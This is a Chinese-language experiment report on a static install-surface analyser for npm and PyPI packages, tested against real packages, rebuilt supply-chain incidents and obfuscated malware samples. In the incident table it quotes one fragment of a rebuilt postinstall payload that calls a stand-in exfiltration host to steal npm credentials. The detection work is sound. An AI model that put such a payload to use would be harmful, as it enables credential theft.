# 安装面账本：验证实验

> [English](SURFACE-EXPERIMENT.md) | 中文
>
> 问题：如果 sift 只保留确定性静态分析、完全不调模型，结果可用吗？价值多大？
> 本文是回答这个问题的实测，语料来自公开发布的真实包，原始输出留在仓库之外。

## 做了什么

`sift surface <tree>` 把一棵树归约为"安装期能力 + `file:line` 证据"；
`sift diff <a> <b>` 报告两个版本之间安装面的增删。两条命令都不调用模型，
也不读取目标树的 `.env` 或 `sift-policy.toml`：账本是被扫描树的纯函数
（`src/surface.rs`、`src/diff.rs`、`Config::for_reader`）。

能力类别固定：`artifact`、`deps`、`execute`、`fs-write`、`hook`、`network`、
`secret`。每条记录带 `trigger`（能触发它的入口）、`confidence`（`strong`
= 该行证明了能力，`weak` = 只表明可达性：import、URL 字面量、环境变量读取）
与 `scope`（`production`、`ci`、`test`、`fixture`、`docs`）。默认作用域为
`production,ci`，被隐藏的条目始终在头部与 `hidden_by_scope` 中计数。

## 方法

* 语料：21 个真实发布的包（11 个 npm、10 个 PyPI），用 `curl` 从
  `registry.npmjs.org` 与 `pypi.org` 下载，`tar` 解包前先拒绝绝对路径与
  `..` 条目。**全程没有执行任何包代码，没有运行包管理器，没有构建。**
* 三个事件复现：以真实发布的**干净版本**为基线，在副本上重新施加公开
  事件报告里记录的载荷（`ua-parser-js@0.7.29` 的 preinstall 下载执行、
  `eslint-scope@3.7.2` 的 postinstall 窃取 `~/.npmrc`、
  `event-stream@3.3.6` 注入的 `flatmap-stream` 依赖）。这三个恶意版本已
  被官方仓库下架，因此载荷是重建的，周边代码树是真实的；恶意代码从未被执行。
* 两个常规发布对照：`express 4.18.1 → 4.18.2`、`requests 2.31.0 → 2.32.0`。

## 结果

### 1. 完整性与成本

| 包 | 候选 | 已扫 | 不支持 | 条目 | strong | weak | 隐藏（作用域） | 耗时 |
|---|---|---|---|---|---|---|---|---|
| npm-axios-1.6.0 | 68 | 66 | 2 | 7 | 7 | 0 | 5 | 122 ms |
| npm-esbuild-0.19.11 | 7 | 6 | 1 | 16 | 16 | 0 | 0 | 100 ms |
| npm-express-4.18.2 | 16 | 15 | 1 | 0 | 0 | 0 | 2 | 80 ms |
| npm-lodash-4.17.21 | 1054 | 1050 | 4 | 4 | 4 | 0 | 0 | 454 ms |
| npm-react-18.2.0 | 20 | 19 | 1 | 1 | 0 | 1 | 0 | 177 ms |
| npm-sharp-0.33.0 | 32 | 30 | 2 | 7 | 5 | 2 | 0 | 263 ms |
| npm-typescript-5.3.3 | 110 | 86 | 24 | 9 | 8 | 1 | 0 | 227 ms |
| npm-ua-parser-js-0.7.28 | 17 | 10 | 7 | 5 | 3 | 2 | 0 | 56 ms |
| pypi-click-8.1.7 | 133 | 72 | 61 | 50 | 25 | 25 | 11 | 345 ms |
| pypi-cryptography-42.0.6 | 405 | 304 | 101 | 31 | 13 | 18 | 120 | 1.6 s |
| pypi-flask-3.0.0 | 233 | 114 | 119 | 14 | 0 | 14 | 13 | 331 ms |
| pypi-httpx-0.26.0 | 69 | 64 | 5 | 21 | 14 | 7 | 839 | 354 ms |
| pypi-numpy-1.26.4 | 7109 | 3422 | 3687 | 200（截断） | 143 | 57 | 147 | 12.9 s |
| pypi-pydantic-2.5.3 | 280 | 266 | 14 | 102 | 88 | 14 | 26 | 1.9 s |
| pypi-pyyaml-6.0.1 | 636 | 49 | 587 | 36 | 33 | 3 | 5 | 230 ms |
| pypi-requests-2.32.0 | 49 | 37 | 12 | 16 | 6 | 10 | 157 | 220 ms |
| pypi-rich-13.7.0 | 83 | 80 | 3 | 13 | 11 | 2 | 0 | 462 ms |
| pypi-setuptools-69.0.3 | 520 | 390 | 130 | 200（截断） | 136 | 64 | 260 | 1.7 s |

* 中位数：**每包 7 条记录、约 230 ms**。无需 Key、无网络、无缓存。
* `package.json` 声明的安装钩子（`preinstall`、`install`、`postinstall`、
  `prepare`、`pack`）：**5/5 全部命中**（axios `prepare`、esbuild
  `postinstall`、sharp `install`，以及两个复现载荷）。
* 修完下列检测器缺陷后，**769 条可见记录中 0 条**未通过自洽性检查
  （该行是否真的含有记录所声称的那类 token）。

### 2. 语料暴露出的误报（已修）

首轮跑完语料比最终结果多出约 40% 的记录，每一条缩减都对应一个真实缺陷，
不是调阈值：

| 缺陷 | 例子 | 修前 → 修后 |
|---|---|---|
| 包元数据被当成依赖来源 | `"homepage": "https://github.com/..."` → `deps/remote-dep-source` | ua-parser-js 8 → 1 |
| 元数据 URL 被当成网络能力 | `"author"`、`"bugs"`、`"funding"` 的 URL → `network/remote-url` | axios 19 → 6 |
| 标识符子串被当成进程创建 | `def detect_subsystem(...)`、`class ColorSystem(...)` → `execute/process-spawn` | numpy 33 → 0 |
| import 被当成强网络调用 | `from urllib.parse import (` → `network/remote-fetch (strong)` | 降级为 `weak` |

### 3. 事件复现：diff 抓到了吗？

| 复现 | diff 结果 | 具体内容 |
|---|---|---|
| `ua-parser-js 0.7.28 → 0.7.29` | **新增 3 条** | `hook/npm-preinstall`、`execute/download-execute`、`network/remote-fetch`，都在 `package.json:150` |
| `eslint-scope 3.7.1 → 3.7.2` | **新增 2 条** | `hook/npm-postinstall`（`package.json:23`）、`network/remote-fetch`（`postinstall.js:5`，`https.request({ host: 'exfil.invalid' …`） |
| `event-stream 3.3.5 → 3.3.6` | **新增 0 条** | **盲点**：注入的 `flatmap-stream` 是 registry 依赖，而账本只跟踪非 registry 来源 |
| 对照：`express 4.18.1 → 4.18.2` | 0 增 0 删 | 常规补丁发布保持安静 |
| 对照：`requests 2.31.0 → 2.32.0` | 9 增 9 删 | 该版本从扁平布局迁到 `src/`，路径是匹配键的一部分，因此移动被报成变化 |

### 4. 真实恶意样本（公开数据集）

三个复现事件的原始版本已被官方仓库下架，因此载荷是重建的。为了对**真实
样本**做度量，从公开的
[Datadog malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset)
（Apache-2.0）取了三个样本——该数据集用带密码的 ZIP（`infected`）分发，
以避免误执行。这里只做只读解包，什么也没有运行。

| 样本 | 形态 | 账本结果 |
|---|---|---|
| `exo-steal@5`（PyPI，恶意意图） | 无混淆 Python 钱包窃取器，11 条记录 | **命中**：`network/remote-fetch` ×5（Telegram 外传）、`secret/env-access` ×3（LOCALAPPDATA/APPDATA/TEMP）、`fs-write/file-write-op`（打包钱包）、`hook/python-setup-command` |
| `debug@4.4.2`（npm，2025-09-08 被投毒） | `src/index.js` 从 314 → **76 754 字节**，3 235 个生成型 `_0x` 标识符，单行 76 438 字符 | **token 检测器完全看不见**（仅 2 条 weak）；`diff 4.4.1 → 4.4.2` 返回 **0 增 0 删、exit 0** |
| `node-ipc@12.0.1`（npm，被投毒） | `node-ipc.cjs` 从 37 308 → **117 315 字节**，4 187 个生成标识符 | 同样不可见；`diff 12.0.0 → 12.0.1` 只报出一个被删除的 `prepare` 钩子 |

这个结果——一个真实的高关注度 npm 投毒对 token 级账本完全不可见——直接
产生了本轮唯一的实现改动：**文件形态审计**。混淆能藏住 token，但藏不住
形态，因此生成型 `_0x` 类标识符 ≥ 100 的文件报为
`artifact/obfuscated_source`（strong），单行 ≥ 20000 字符报为
`artifact/minified_source`（weak），并把文件度量作为证据。

改动之后：

| 样本 | 账本结果 | diff 结果 |
|---|---|---|
| `debug 4.4.1 → 4.4.2` | `artifact strong obfuscated_source src/index.js bytes=76754 lines=12 max_line=76438 generated_idents=3235` | **exit 1，新增 1 条**，直指载荷文件 |
| `node-ipc 12.0.0 → 12.0.1` | `artifact strong obfuscated_source node-ipc.cjs bytes=117315 lines=1271 max_line=80078 generated_idents=4187` | **exit 1，新增 1 条** |

精度检查：在 21 个良性包语料上，形态信号只触发 **1 次**——
`setuptools/config/_validate_pyproject/fastjsonschema_validations.py`
（28 283 字符的生成行），且是 `weak` 而非 `strong`。

### 5. 语料暴露的结构性边界（每条都有便宜的修法）

1. **AST 调用证据只有被调名，没有实参。** JavaScript 调用被记成
   `fs.readFileSync` 或 `https.request`，载荷的目标路径（`~/.npmrc`）
   因此不可见：`eslint-scope` 复现里 `network` 命中了，`secret` 没有。
   修法：调用位置记录整行（或实参列表）——基于行的脱水器已经这么做，
   上游的截断机制也已存在。
2. **依赖注入不可见。** `event-stream@3.3.6` 新增了一个良性 registry 依赖，
   载荷藏在其中——这是最常见的 npm 攻击形态，而账本与 diff 都察觉不到。
   修法：真正解析 manifest，把声明的依赖（`name@spec`）记为 `deps` 记录，
   而不是只做行级 token 匹配。
3. **vendored / 生成目录会淹没大 sdist。** numpy：7109 个候选、3687 个不支持、
   `vendored-meson/` 里约 1960 条 `hook`。修法：`DEFAULT_IGNORES` 增加
   `vendored*`，并保留 `--limit`（默认 200，截断可见）作为兜底。
4. **目录重构看起来像安装面变化。** `requests` 对照的 9 增 9 删纯粹因为
   路径移动。修法：键未命中时回退到 `(能力, basename, 文本)` 匹配。

## 结论

纯静态的 sift 可行：在真实发布的包上，它以几百毫秒、无需 Key、无网络、
不执行任何代码的代价，产出小而确定、锚定到 file:line 的安装面账本；
在三个复现事件里，它以**与上一个版本的 diff** 形式命中了两个载荷。
它的价值不是"风险评分"，而是"这东西在安装时到底会做什么，以及相对
我已经信任的那个版本变了什么"。

度量同时说明了这份价值取决于什么。在真实样本上，账本直接命中了无混淆的
窃取器，却对两个真实的混淆型投毒完全失明——直到证据模型从**token**扩展为
**token + 形态**。所以真正的约束是证据模型（只有被调名、没有实参，也没有
文件形态度量）、依赖模型（只有来源、没有依赖集合）与作用域默认值
（docs/tests/vendored），而不是规则数量。形态这条已经补上，其余三条是
结构性修复，不是调参。

## 复现

```sh
# 语料 + 复现（只下载，绝不执行包代码）
/tmp/sift-lab/harness.sh
/tmp/sift-lab/run_surfaces.sh

# 单个包
sift surface ./pkg --capability network,execute --fail-on execute
sift diff ./pkg-1.2.3 ./pkg-1.4.0 --format json
```
